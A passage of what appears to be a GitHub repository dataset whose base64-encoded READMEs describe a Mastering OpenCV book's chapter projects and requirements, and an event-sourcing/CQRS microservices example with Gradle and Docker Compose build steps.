LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tDQpDaGFwdGVyczoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQotIENoMSkgQ2FydG9vbmlmaWVyIGFuZCBTa2luIENoYW5n
ZXIgZm9yIEFuZHJvaWQsIGJ5IFNoZXJ2aW4gRW1hbWkuDQotIENoMikgTWFy
a2VyLWJhc2VkIEF1Z21lbnRlZCBSZWFsaXR5IG9uIGlQaG9uZSBvciBpUGFk
LCBieSBLaHZlZGNoZW5pYSBJZXZnZW4uDQotIENoMykgTWFya2VyLWxlc3Mg
QXVnbWVudGVkIFJlYWxpdHksIGJ5IEtodmVkY2hlbmlhIElldmdlbi4NCi0g
Q2g0KSBFeHBsb3JpbmcgU3RydWN0dXJlIGZyb20gTW90aW9uIHVzaW5nIE9w
ZW5DViwgYnkgUm95IFNoaWxrcm90Lg0KLSBDaDUpIE51bWJlciBQbGF0ZSBS
ZWNvZ25pdGlvbiB1c2luZyBTVk0gYW5kIE5ldXJhbCBOZXR3b3JrcywgYnkg
RGF2aWQgRXNjcml2w6EuDQotIENoNikgTm9uLXJpZ2lkIEZhY2UgVHJhY2tp
bmcsIGJ5IEphc29uIFNhcmFnaWguDQotIENoNykgM0QgSGVhZCBQb3NlIEVz
dGltYXRpb24gdXNpbmcgQUFNIGFuZCBQT1NJVCwgYnkgRGFuaWVsIEzDqWxp
cyBCYWdnaW8uDQotIENoOCkgRmFjZSBSZWNvZ25pdGlvbiB1c2luZyBFaWdl
bmZhY2VzIG9yIEZpc2hlcmZhY2VzLCBieSBTaGVydmluIEVtYW1pLg0KLSBD
aDkpIERldmVsb3BpbmcgRmx1aWQgV2FsbCB1c2luZyB0aGUgTWljcm9zb2Z0
IEtpbmVjdCwgYnkgTmF1cmVlbiBNYWhtb29kLg0KDQoNCi0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpXaGF0IHlvdSBuZWVkIGZvciB0
aGlzIGJvb2s6DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LQ0KWW91IGRvbid0IG5lZWQgdG8gaGF2ZSBzcGVjaWFsIGtub3dsZWRnZSBp
biBjb21wdXRlciB2aXNpb24gdG8gcmVhZCB0aGlzIGJvb2ssDQpidXQgeW91
IHNob3VsZCBoYXZlIGdvb2QgQy9DKysgcHJvZ3JhbW1pbmcgc2tpbGxzIGFu
ZCBiYXNpYyBleHBlcmllbmNlIHdpdGgNCk9wZW5DViBiZWZvcmUgcmVhZGlu
ZyB0aGlzIGJvb2suIFJlYWRlcnMgd2l0aG91dCBleHBlcmllbmNlIGluIE9w
ZW5DViBtYXkgd2lzaCB0bw0KcmVhZCB0aGUgYm9vayBMZWFybmluZyBPcGVu
Q1YgZm9yIGFuIGludHJvZHVjdGlvbiB0byB0aGUgT3BlbkNWIGZlYXR1cmVz
LCBvciByZWFkDQoiT3BlbkNWIDIgQ29va2Jvb2siIGZvciBleGFtcGxlcyBv
biBob3cgdG8gdXNlIE9wZW5DViB3aXRoIHJlY29tbWVuZGVkIEMvQysrDQpw
YXR0ZXJucywgYmVjYXVzZSAiTWFzdGVyaW5nIE9wZW5DViB3aXRoIFByYWN0
aWNhbCBDb21wdXRlciBWaXNpb24gUHJvamVjdHMiIHdpbGwNCnNob3cgeW91
IGhvdyB0byBzb2x2ZSByZWFsIHByb2JsZW1zLCBhc3N1bWluZyB5b3UgYXJl
IGFscmVhZHkgZmFtaWxpYXIgd2l0aCB0aGUNCmJhc2ljcyBvZiBPcGVuQ1Yg
YW5kIEMvQysrIGRldmVsb3BtZW50Lg0KDQpJbiBhZGRpdGlvbiB0byBDL0Mr
KyBhbmQgT3BlbkNWIGV4cGVyaWVuY2UsIHlvdSB3aWxsIGFsc28gbmVlZCBh
IGNvbXB1dGVyLCBhbmQgYW4NCklERSBvZiB5b3VyIGNob2ljZSAoc3VjaCBh
cyBWaXN1YWwgU3R1ZGlvLCBYQ29kZSwgRWNsaXBzZSwgb3IgUXRDcmVhdG9y
LCBydW5uaW5nDQpvbiBXaW5kb3dzLCBNYWMgb3IgTGludXgpLiBTb21lIGNo
YXB0ZXJzIGhhdmUgZnVydGhlciByZXF1aXJlbWVudHMsIHBhcnRpY3VsYXJs
eToNCg0KLSBUbyBkZXZlbG9wIHRoZSBBbmRyb2lkIGFwcCwgeW91IHdpbGwg
bmVlZCBhbiBBbmRyb2lkIGRldmljZSwgQW5kcm9pZA0KICBkZXZlbG9wbWVu
dCB0b29scywgYW5kIGJhc2ljIEFuZHJvaWQgZGV2ZWxvcG1lbnQgZXhwZXJp
ZW5jZS4NCi0gVG8gZGV2ZWxvcCB0aGUgaU9TIGFwcCwgeW91IHdpbGwgbmVl
ZCBhbiBpUGhvbmUsIGlQYWQsIG9yIGlQb2QgVG91Y2ggZGV2aWNlLA0KICBp
T1MgZGV2ZWxvcG1lbnQgdG9vbHMgKGluY2x1ZGluZyBhbiBBcHBsZSBjb21w
dXRlciwgWENvZGUgSURFLCBhbmQgYW4gQXBwbGUNCiAgRGV2ZWxvcGVyIENl
cnRpZmljYXRlKSwgYW5kIGJhc2ljIGlPUyBhbmQgT2JqZWN0aXZlLUMgZGV2
ZWxvcG1lbnQgZXhwZXJpZW5jZS4NCi0gU2V2ZXJhbCBkZXNrdG9wIHByb2pl
Y3RzIHJlcXVpcmUgYSB3ZWJjYW0gY29ubmVjdGVkIHRvIHlvdXIgY29tcHV0
ZXIuIEFueQ0KICBjb21tb24gVVNCIHdlYmNhbSBzaG91bGQgc3VmZmljZSwg
YnV0IGEgd2ViY2FtIG9mIGF0IGxlYXN0IDEgbWVnYXBpeGVsIG1heSBiZQ0K
ICBkZXNpcmFibGUuDQotIENNYWtlIGlzIHVzZWQgaW4gbW9zdCBwcm9qZWN0
cywgaW5jbHVkaW5nIE9wZW5DViBpdHNlbGYsIHRvIGJ1aWxkIGFjcm9zcw0K
ICBvcGVyYXRpbmcgc3lzdGVtcyBhbmQgY29tcGlsZXJzLiBBIGJhc2ljIHVu
ZGVyc3RhbmRpbmcgb2YgYnVpbGQgc3lzdGVtcyBpcw0KICByZXF1aXJlZCwg
YW5kIGtub3dsZWRnZSBvZiBjcm9zcy1wbGF0Zm9ybSBidWlsZGluZyBpcyBy
ZWNvbW1lbmRlZC4NCi0gQW4gdW5kZXJzdGFuZGluZyBvZiBsaW5lYXIgYWxn
ZWJyYSBpcyBleHBlY3RlZCwgc3VjaCBhcyBiYXNpYyB2ZWN0b3IgYW5kIG1h
dHJpeA0KICBvcGVyYXRpb25zIGFuZCBlaWdlbiBkZWNvbXBvc2l0aW9uLg0K
DQpQZXItY2hhcHRlciBSZXF1aXJlbWVudHM6DQotIENoMTogd2ViY2FtIChm
b3IgZGVza3RvcCBhcHApLCBvciBBbmRyb2lkIGRldmVsb3BtZW50IHN5c3Rl
bSAoZm9yIEFuZHJvaWQgYXBwKS4NCi0gQ2gyOiBpT1MgZGV2ZWxvcG1lbnQg
c3lzdGVtICh0byBidWlsZCBhbiBpT1MgYXBwKS4NCi0gQ2gzOiBPcGVuR0wg
YnVpbHQgaW50byBPcGVuQ1YuDQotIENoNDogUENMIChodHRwOi8vcG9pbnRj
bG91ZHMub3JnLykgYW5kIFNTQkEgKGh0dHA6Ly93d3cuaW5mLmV0aHouY2gv
cGVyc29uYWwvY2h6YWNoL29wZW5zb3VyY2UuaHRtbCkuDQotIENoNTogbm90
aGluZy4NCi0gQ2g2OiBub3RoaW5nLCBidXQgcmVxdWlyZXMgdHJhaW5pbmcg
ZGF0YSBmb3IgZXhlY3V0aW9uLg0KLSBDaDc6IG5vdGhpbmcuDQotIENoODog
d2ViY2FtLg0KLSBDaDk6IEtpbmVjdCBkZXB0aCBzZW5zb3IuDQoNCg0KLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NClNjcmVlbnNob3Rz
Og0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCi0gQ2gx
KSBDYXJ0b29uaWZpZXIgYW5kIFNraW4gQ2hhbmdlciBmb3IgQW5kcm9pZDoN
CiFbQ2gxKSBDYXJ0b29uaWZpZXIgYW5kIFNraW4gQ2hhbmdlciBmb3IgQW5k
cm9pZF0oaHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NYXN0ZXJpbmdPcGVuQ1Yv
Y29kZS9tYXN0ZXIvQ2hhcHRlcjFfQW5kcm9pZENhcnRvb25pZmllci9zY3Jl
ZW5zaG90LnBuZykNCi0gQ2gyKSBNYXJrZXItYmFzZWQgQXVnbWVudGVkIFJl
YWxpdHkgb24gaVBob25lIG9yIGlQYWQ6DQohW0NoMikgTWFya2VyLWJhc2Vk
IEF1Z21lbnRlZCBSZWFsaXR5IG9uIGlQaG9uZSBvciBpUGFkXShodHRwczov
L3Jhdy5naXRodWIuY29tL01hc3RlcmluZ09wZW5DVi9jb2RlL21hc3Rlci9D
aGFwdGVyMl9pUGhvbmVBUi9zY3JlZW5zaG90LnBuZykNCi0gQ2gzKSBNYXJr
ZXItbGVzcyBBdWdtZW50ZWQgUmVhbGl0eToNCiFbQ2gzKSBNYXJrZXItbGVz
cyBBdWdtZW50ZWQgUmVhbGl0eV0oaHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9N
YXN0ZXJpbmdPcGVuQ1YvY29kZS9tYXN0ZXIvQ2hhcHRlcjNfTWFya2VybGVz
c0FSL3NjcmVlbnNob3QucG5nKQ0KLSBDaDQpIEV4cGxvcmluZyBTdHJ1Y3R1
cmUgZnJvbSBNb3Rpb24gdXNpbmcgT3BlbkNWOg0KIVtDaDQpIEV4cGxvcmlu
ZyBTdHJ1Y3R1cmUgZnJvbSBNb3Rpb24gdXNpbmcgT3BlbkNWXShodHRwczov
L3Jhdy5naXRodWIuY29tL01hc3RlcmluZ09wZW5DVi9jb2RlL21hc3Rlci9D
aGFwdGVyNF9TdHJ1Y3R1cmVGcm9tTW90aW9uL3NjcmVlbnNob3QucG5nKQ0K
LSBDaDUpIE51bWJlciBQbGF0ZSBSZWNvZ25pdGlvbiB1c2luZyBTVk0gYW5k
IE5ldXJhbCBOZXR3b3JrczoNCiFbQ2g1KSBOdW1iZXIgUGxhdGUgUmVjb2du
aXRpb24gdXNpbmcgU1ZNIGFuZCBOZXVyYWwgTmV0d29ya3NdKGh0dHBzOi8v
cmF3LmdpdGh1Yi5jb20vTWFzdGVyaW5nT3BlbkNWL2NvZGUvbWFzdGVyL0No
YXB0ZXI1X051bWJlclBsYXRlUmVjb2duaXRpb24vc2NyZWVuc2hvdC5wbmcp
DQotIENoNikgTm9uLXJpZ2lkIEZhY2UgVHJhY2tpbmc6DQohW0NoNikgTm9u
LXJpZ2lkIEZhY2UgVHJhY2tpbmddKGh0dHBzOi8vcmF3LmdpdGh1Yi5jb20v
TWFzdGVyaW5nT3BlbkNWL2NvZGUvbWFzdGVyL0NoYXB0ZXI2X05vblJpZ2lk
RmFjZVRyYWNraW5nL3NjcmVlbnNob3QucG5nKQ0KLSBDaDcpIDNEIEhlYWQg
UG9zZSBFc3RpbWF0aW9uIHVzaW5nIEFBTSBhbmQgUE9TSVQ6DQohW0NoNykg
M0QgSGVhZCBQb3NlIEVzdGltYXRpb24gdXNpbmcgQUFNIGFuZCBQT1NJVF0o
aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NYXN0ZXJpbmdPcGVuQ1YvY29kZS9t
YXN0ZXIvQ2hhcHRlcjdfSGVhZFBvc2VFc3RpbWF0aW9uL3NjcmVlbnNob3Qu
cG5nKQ0KLSBDaDgpIEZhY2UgUmVjb2duaXRpb24gdXNpbmcgRWlnZW5mYWNl
cyBvciBGaXNoZXJmYWNlczoNCiFbQ2g4KSBGYWNlIFJlY29nbml0aW9uIHVz
aW5nIEVpZ2VuZmFjZXMgb3IgRmlzaGVyZmFjZXNdKGh0dHBzOi8vcmF3Lmdp
dGh1Yi5jb20vTWFzdGVyaW5nT3BlbkNWL2NvZGUvbWFzdGVyL0NoYXB0ZXI4
X0ZhY2VSZWNvZ25pdGlvbi9zY3JlZW5zaG90LnBuZykNCi0gQ2g5KSBEZXZl
bG9waW5nIEZsdWlkIFdhbGwgdXNpbmcgdGhlIE1pY3Jvc29mdCBLaW5lY3Q6
DQohW0NoOSkgRGV2ZWxvcGluZyBGbHVpZCBXYWxsIHVzaW5nIHRoZSBNaWNy
b3NvZnQgS2luZWN0XShodHRwczovL3Jhdy5naXRodWIuY29tL01hc3Rlcmlu
Z09wZW5DVi9jb2RlL21hc3Rlci9DaGFwdGVyOV9GbHVpZEludGVyYWN0aW9u
VXNpbmdLaW5lY3Qvc2NyZWVuc2hvdC5wbmcpDQoNCg0K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'event-sourcing-examples',28677272,"b'Example code for my building and deploying microservices with event sourcing, CQRS and Docker presentation'",b'JavaScript',20,2379,,2379,False,b'https://api.github.com/repos/cer/event-sourcing-examples/forks',"IyBFdmVudC1Tb3VyY2luZytDUVJTIGV4YW1wbGUgYXBwbGljYXRpb24KClRo
aXMgZXhhbXBsZSBhcHBsaWNhdGlvbiBpcyB0aGUgbW9uZXkgdHJhbnNmZXIg
YXBwbGljYXRpb24gZGVzY3JpYmVkIGluIG15IHRhbGsgW0J1aWxkaW5nIGFu
ZCBkZXBsb3lpbmcgbWljcm9zZXJ2aWNlcyB3aXRoIGV2ZW50IHNvdXJjaW5n
LCBDUVJTIGFuZCBEb2NrZXJdKGh0dHA6Ly9wbGFpbm9sZG9iamVjdHMuY29t
L3ByZXNlbnRhdGlvbnMvYnVpbGRpbmctYW5kLWRlcGxveWluZy1taWNyb3Nl
cnZpY2VzLXdpdGgtZXZlbnQtc291cmNpbmctY3Fycy1hbmQtZG9ja2VyLyku
ClRoaXMgdGFsayBkZXNjcmliZXMgYSB3YXkgb2YgYXJjaGl0ZWN0aW5nIGhp
Z2hseSBzY2FsYWJsZSBhbmQgYXZhaWxhYmxlIGFwcGxpY2F0aW9ucyB0aGF0
IGlzIGJhc2VkIG9uIG1pY3Jvc2VydmljZXMsIHBvbHlnbG90IHBlcnNpc3Rl
bmNlLApldmVudCBzb3VyY2luZyAoRVMpIGFuZCBjb21tYW5kIHF1ZXJ5IHJl
c3BvbnNpYmlsaXR5IHNlZ3JlZ2F0aW9uIChDUVJTKS4KQXBwbGljYXRpb25z
IGNvbnNpc3Qgb2YgbG9vc2VseSBjb3VwbGVkIGNvbXBvbmVudHMgdGhhdCBj
b21tdW5pY2F0ZSB1c2luZyBldmVudHMuClRoZXNlIGNvbXBvbmVudHMgY2Fu
IGJlIGRlcGxveWVkIGVpdGhlciBhcyBzZXBhcmF0ZSBzZXJ2aWNlcyBvciBw
YWNrYWdlZCBhcyBhIG1vbm9saXRoaWMgYXBwbGljYXRpb24gZm9yIHNpbXBs
aWZpZWQgZGV2ZWxvcG1lbnQgYW5kIHRlc3RpbmcuCgojIEJ1aWx0IHVzaW5n
IHRoZSBFdmVudHVhdGUgcGxhdGZvcm0KCjxhIGhyZWY9Imh0dHA6Ly9ldmVu
dHVhdGUuaW8iPjxpbWcgc3JjPSJodHRwOi8vZXZlbnR1YXRlLmlvL2kvbG9n
by5naWYiPiA8L2E+CgpSZWFkIHRoZSA8YSBocmVmPSJodHRwOi8vZXZlbnR1
YXRlLmlvIj5vdmVydmlldzwvYT4gb3IgbG9vayBhdCB0aGUgb3RoZXIgPGEg
aHJlZj0iaHR0cDovL2V2ZW50dWF0ZS5pby9leGFtcGxlYXBwcy5odG1sIj5l
eGFtcGxlIGFwcGxpY2F0aW9uczwvYT4uCgojIEJpZyBpZGVhcwoKVGhpcyBl
eGFtcGxlIGlsbHVzdHJhdGVzIHNldmVyYWwgaW1wb3J0YW50IGNvbmNlcHRz
OgoKKiBIb3cgdG8gZGVjb21wb3NlIGFuIGFwcGxpY2F0aW9uIGludG8gbWlj
cm9zZXJ2aWNlcyAtIGFzIGRlc2NyaWJlZCBiZWxvdyB0aGUgYXBwbGljYXRp
b24gY29uc2lzdHMgb2Ygc2V2ZXJhbCBzZXJ2aWNlcy4KRm9yIGV4YW1wbGUs
IGJhbmsgYWNjb3VudHMgYXJlIG1hbmFnZWQgYnkgb25lIHNlcnZpY2UsIG1v
bmV5IHRyYW5zZmVycyBieSBhbm90aGVyIHNlcnZpY2UuCgoqIFVzaW5nIGFu
IGV2ZW50LWRyaXZlbiBhcmNoaXRlY3R1cmUgdG8gYWNoaWV2ZSBkYXRhIGNv
bnNpc3RlbmN5IC0gcmF0aGVyIHRoYW4gdXNpbmcgdHJhZGl0aW9uYWwgZGlz
dHJpYnV0ZWQgdHJhbnNhY3Rpb24gdG8gbWFpbnRhaW4gZGF0YWJhc2UgY29u
c2lzdGVuY3kgdGhpcyBhcHBsaWNhdGlvbiB1c2VzIGFuIGV2ZW50dWFsbHkg
Y29uc2lzdGVudCwgZXZlbnQtZHJpdmVuIGFwcHJvYWNoLgoKKiBVc2luZyBl
dmVudCBzb3VyY2luZyB0byBpbXBsZW1lbnQgdGhlIGV2ZW50LWRyaXZlbiBh
cmNoaXRlY3R1cmUgLSB0aGUgZG9tYWluIGxvZ2ljIGNvbnNpc3RzIG9mIERv
bWFpbi1Ecml2ZW4gRGVzaWduIChEREQpIGFnZ3JlZ2F0ZXMgdGhhdCB1c2lu
ZyBldmVudCBzb3VyY2luZy4KCiogVXNpbmcgQ29tbWFuZCBRdWVyeSBSZXNw
b25zaWJpbGl0eSBTZWdyZWdhdGlvbiAoQ1FSUykgLSB1cGRhdGUgcmVxdWVz
dHMgKEhUVFAgUE9TVHMgYW5kIFBVVHMpIGFuZCB2aWV3IHJlcXVlc3RzIChI
VFRQIEdFVHMpIGFyZSBoYW5kbGVkIGJ5IHNlcGFyYXRlIHNlcnZpY2VzLgoK
KiBIb3cgZXZlbnQgc291cmNpbmcgZW5hYmxlcyBkZXBsb3ltZW50IGZsZXhp
YmlsaXR5IC0gdGhlIGFwcGxpY2F0aW9uIGNhbiBlaXRoZXIgYmUgZGVwbG95
ZWQgYXMgYSBtb25vbGl0aCBvciBhcyBtaWNyb3NlcnZpY2VzLgoKIyBBYm91
dCB0aGUgZXhhbXBsZSBhcHBsaWNhdGlvbgoKVGhpcyBleGFtcGxlIGFwcGxp
Y2F0aW9uIHByb3ZpZGVzIGEgUkVTVCBBUEkgZm9yIGNyZWF0aW5nIGFuZCB2
aWV3aW5nIGJhbmsgYWNjb3VudHMgYW5kIHRyYW5zZmVycmluZyBtb25leSBi
ZXR3ZWVuIHRoZW0uCgpUaGUgZm9sbG93aW5nIGRpYWdyYW0gc2hvd3MgdGhl
IGFyY2hpdGVjdHVyZToKCiFbTW9uZXkgdHJhbnNmZXIgYXJjaGl0ZWN0dXJl
XShodHRwczovL2dpdGh1Yi5jb20vY2VyL2V2ZW50LXNvdXJjaW5nLWV4YW1w
bGVzL3dpa2kvaS9hcHBsaWNhdGlvbmFyY2hpdGVjdHVyZS5wbmcpCgpUaGVy
ZSBhcmUgdGhlIGZvbGxvd2luZyAgc2VydmljZXM6CgoqIEN1c3RvbWVycyBT
ZXJ2aWNlIC0gUkVTVCBBUEkgZm9yIGNyZWF0aW5nIGN1c3RvbWVycwoqIEFj
Y291bnRzIFNlcnZpY2UgLSBSRVNUIEFQSSBmb3IgY3JlYXRpbmcgYWNjb3Vu
dHMKKiBUcmFuc2FjdGlvbnMgU2VydmljZSAtIFJFU1QgQVBJIGZvciB0cmFu
c2ZlcnJpbmcgbW9uZXkKKiBDdXN0b21lcnMgVmlldyBTZXJ2aWNlICAtIHN1
YnNjcmliZXMgdG8gZXZlbnRzIGFuZCB1cGRhdGVzIGEgTW9uZ29EQiBWaWV3
LCBhbmQgcHJvdmlkZXMgYW4gQVBJIGZvciByZXRyaWV2aW5nIGN1c3RvbWVy
cwoqIEFjY291bnRzIFZpZXcgU2VydmljZSAtIHN1YnNjcmliZXMgdG8gZXZl
bnRzIGFuZCB1cGRhdGVzIGEgTW9uZ29EQiBWaWV3LCBhbmQgcHJvdmlkZXMg
YW4gQVBJIGZvciByZXRyaWV2aW5nIGFjY291bnRzCgpUaGVyZSBpcyBhbHNv
IGFuIFtBUEkgZ2F0ZXdheV0oaHR0cDovL21pY3Jvc2VydmljZXMuaW8vcGF0
dGVybnMvYXBpZ2F0ZXdheS5odG1sKSBzZXJ2aWNlIHRoYXQgYWN0cyBhcyBh
IEZhY2FkZSBpbiBmcm9udCBvZiB0aGUgc2VydmljZXMuCgojIEFib3V0IHRo
ZSBleGFtcGxlcwoKVGhlcmUgYXJlIGN1cnJlbnRseSB0aGUgZm9sbG93aW5n
IHZlcnNpb25zIG9mIHRoZSBleGFtcGxlIGFwcGxpY2F0aW9uOgoKICAqIGph
dmEtc3ByaW5nIC0gYSBKYXZhIGFuZCBTcHJpbmcgQm9vdCBleGFtcGxlCiAg
KiBzY2FsYS1zcHJpbmcgLSBhIFNjYWxhIGFuZCBTcHJpbmcgQm9vdCBleGFt
cGxlIChOT1RFOiB0aGlzIHZlcnNpb24gaXMgbGFnZ2luZyB0aGUgSmF2YSBT
cHJpbmcgYW5kIGhhc24ndCBiZWVuIHVwZGF0ZWQgaW4gYSBsb25ndGltZS4p
CgpPdGhlciBleGFtcGxlcyB3aWxsIGJlIGFkZGVkIHNob3J0bHkgaW5jbHVk
aW5nIGEgU2NhbGEvUGxheSBleGFtcGxlLgoKRm9yIG1vcmUgaW5mb3JtYXRp
b24sIHBsZWFzZSBzZWUgdGhlIFt3aWtpXSguLi8uLi93aWtpKQoKIyBBYm91
dCB0aGUgRXZlbnR1YXRlIFBsYXRmb3JtCgpUaGUgYXBwbGljYXRpb24gaXMg
YnVpbHQgdXNpbmcgW0V2ZW50dWF0ZV0oaHR0cDovL2V2ZW50dWF0ZS5pby8p
LCB3aGljaCBpcyBhbiBhcHBsaWNhdGlvbiBwbGF0Zm9ybSBmb3Igd3JpdGlu
ZyB0cmFuc2FjdGlvbmFsIG1pY3Jvc2VydmljZXMuCkl0IHByb3ZpZGVzIGEg
c2ltcGxlIHlldCBwb3dlcmZ1bCBldmVudC1kcml2ZW4gcHJvZ3JhbW1pbmcg
bW9kZWwgdGhhdCBpcyBiYXNlZCBvbiBldmVudCBzb3VyY2luZyBhbmQgQ29t
bWFuZCBRdWVyeSBSZXNwb25zaWJpbGl0eSBTZWdyZWdhdGlvbiAoQ1FSUyku
CkV2ZW50dWF0ZSBzb2x2ZXMgdGhlIGRpc3RyaWJ1dGVkIGRhdGEgbWFuYWdl
bWVudCBwcm9ibGVtcyBpbmhlcmVudCBpbiBhIG1pY3Jvc2VydmljZSBhcmNo
aXRlY3R1cmUuCkl0IGNvbnNpc3RzIG9mIGEgc2NhbGFibGUsIGRpc3RyaWJ1
dGVkIGV2ZW50IHN0b3JlIGFuZCBjbGllbnQgbGlicmFyaWVzIGZvciB2YXJp
b3VzIGxhbmd1YWdlcyBhbmQgZnJhbWV3b3JrcyBpbmNsdWRpbmcgSmF2YSwg
U2NhbGEsIGFuZCB0aGUgU3ByaW5nIGZyYW1ld29yay4KClRoZXJlIGFyZSB0
d28gdmVyc2lvbnMgb2YgRXZlbnR1YXRlOgoKKiBbRXZlbnR1YXRlIFNhYVMg
c2VydmVyXShodHRwOi8vZXZlbnR1YXRlLmlvL3VzaW5nZXZlbnR1YXRlLmh0
bWwpIC0gdGhpcyBpcyBhIGZ1bGwgZmVhdHVyZWQgZXZlbnQgc3RvcmUgdGhh
dCBpcyBob3N0ZWQgb24gQVdTCiogW0V2ZW50dWF0ZSBMb2NhbF0oaHR0cDov
L2V2ZW50dWF0ZS5pby91c2luZ2V2ZW50dWF0ZS5odG1sKSAtIGFuIG9wZW4t
c291cmNlIGV2ZW50IHN0b3JlIHRoYXQgaXMgYnVpbHQgdXNpbmcgTXlTUUwg
YW5kIEthZmthCgpUaGVyZSBpcyBhbHNvIGFuIGVtYmVkZGVkIHRlc3QgZXZl
bnQgc3RvcmUsIHdoaWNoIGlzIGdyZWF0IGZvciBpbnRlZ3JhdGlvbiB0ZXN0
cy4KCiMgQnVpbGRpbmcgYW5kIHJ1bm5pbmcgdGhlIG1pY3Jvc2VydmljZXMK
ClRoaXMgaXMgYSBHcmFkbGUgcHJvamVjdC4KSG93ZXZlciwgeW91IGRvIG5v
dCBuZWVkIHRvIGluc3RhbGwgR3JhZGxlIHNpbmNlIGl0IHdpbGwgYmUgZG93
bmxvYWRlZCBhdXRvbWF0aWNhbGx5LgpZb3UganVzdCBuZWVkIHRvIGhhdmUg
SmF2YSA4IGluc3RhbGxlZC4KClRoZSBkZXRhaWxzIG9mIGhvdyB0byBidWls
ZCBhbmQgcnVuIHRoZSBzZXJ2aWNlcyBkZXBlbmQgc2xpZ2h0bHkgb24gd2hl
dGhlciB5b3UgYXJlIHVzaW5nIEV2ZW50dWF0ZSBTYWFTIG9yIEV2ZW50dWF0
ZSBMb2NhbC4KCiMjIEJ1aWxkaW5nIGFuZCBydW5uaW5nIHVzaW5nIEV2ZW50
dWF0ZSBTYWFTCgpGaXJzdCwgbXVzdCBbc2lnbiB1cCB0byBnZXQgeW91ciBj
cmVkZW50aWFsc10oaHR0cHM6Ly9zaWdudXAuZXZlbnR1YXRlLmlvLykgaW4g
b3JkZXIgdG8gZ2V0IGZyZWUgYWNjZXNzIHRvIHRoZSBTYWFTIHZlcnNpb24u
CgpOZXh0LCBidWlsZCB0aGUgYXBwbGljYXRpb24KCmBgYApjZCBqYXZhLXNw
cmluZwouL2dyYWRsZXcgYXNzZW1ibGUKYGBgCgpOZXh0LCB5b3UgY2FuIGxh
dW5jaCB0aGUgc2VydmljZXMgdXNpbmcgW0RvY2tlciBDb21wb3NlXShodHRw
czovL2RvY3MuZG9ja2VyLmNvbS9jb21wb3NlLyk6CgpgYGAKZG9ja2VyLWNv
bXBvc2UgdXAgLWQKYGBgCgpGaW5hbGx5LCB5b3UgY2FuIG9wZW4gdGhlIGhv
bWUgcGFnZSwgd2hpY2ggaXMgc2VydmVkIHVwIGJ5IHRoZSBBUEkgR2F0ZXdh
eTogYGh0dHA6Ly8kRE9DS0VSX0hPU1RfSVA6ODA4MGAKCk5vdGU6IGBET0NL
RVJfSE9TVF9JUGAgaXMgdGhlIElQIGFkZHJlc3Mgb2YgdGhlIG1hY2hpbmUg
d2hlcmUgRG9ja2VyIGlzIHJ1bm5pbmcsIGUuZy4gdGhlIElQIGFkZHJlc3Mg
b2YgdGhlIFZpcnR1YWxCb3ggVk0uCgojIyBCdWlsZGluZyBhbmQgcnVubmlu
ZyB1c2luZyBFdmVudHVhdGUgTG9jYWwKCkZpcnN0LCBidWlsZCB0aGUgYXBw
bGljYXRpb24KCmBgYApjZCBqYXZhLXNwcmluZwouL2dyYWRsZXcgYXNzZW1i
bGUgLVAgZXZlbnR1YXRlRHJpdmVyPWxvY2FsCmBgYAoKTmV4dCwgbGF1bmNo
IHRoZSBzZXJ2aWNlcyB1c2luZyBbRG9ja2VyIENvbXBvc2VdKGh0dHBzOi8v
ZG9jcy5kb2NrZXIuY29tL2NvbXBvc2UvKToKCmBgYApleHBvcnQgRE9DS0VS
X0hPU1RfSVA9Li4uCmRvY2tlci1jb21wb3NlIC1mIGRvY2tlci1jb21wb3Nl
LWV2ZW50dWF0ZS1sb2NhbC55bWwgdXAgLWQKYGBgCgpOb3RlOiBZb3UgbmVl
ZCB0byBzZXQgYERPQ0tFUl9IT1NUX0lQYCBiZWZvcmUgcnVubmluZyBEb2Nr
ZXIgQ29tcG9zZS4KVGhpcyBtdXN0IGJlIGFuIElQIGFkZHJlc3Mgb3IgcmVz
b2x2YWJsZSBob3N0bmFtZS4KSXQgY2Fubm90IGJlIGBsb2NhbGhvc3RgLgpT
ZWUgdGhpcyBbZ3VpZGUgdG8gc2V0dGluZyBgRE9DS0VSX0hPU1RfSVBgXSho
dHRwOi8vZXZlbnR1YXRlLmlvL2RvY3MvdXNpbmdkb2NrZXIuaHRtbCkgZm9y
IG1vcmUgaW5mb3JtYXRpb24uCgpGaW5hbGx5LCB5b3UgY2FuIG9wZW4gdGhl
IGhvbWUgcGFnZSwgd2hpY2ggaXMgc2VydmVkIHVwIGJ5IHRoZSBBUEkgR2F0
ZXdheTogYGh0dHA6Ly8kRE9DS0VSX0hPU1RfSVA6ODA4MGAK
